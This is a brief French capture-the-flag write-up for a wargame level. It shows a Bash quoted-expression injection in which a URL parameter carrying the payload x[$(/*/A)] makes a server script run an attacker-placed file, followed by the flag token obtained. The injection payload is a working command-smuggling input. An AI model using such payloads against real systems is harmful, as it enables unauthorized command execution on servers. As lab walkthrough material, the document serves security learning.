# Level 12
Web resources: 
- source: https://www.root-me.org/fr/Challenges/App-Script/Bash-quoted-expression-injection

- On ecrit un script qui execute getflag
  - `cat /tmp/A`
  ```
  #!/bin/bash
  
  getflag > /tmp/flag
  ```
- On execute ce script avec une variable
  - https://192.168.1.39/?x=x%5B%24(%2F*%2FA)%5D  _(`x[$(/*/A)]`)_
- `cat /tmp/flag`
```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
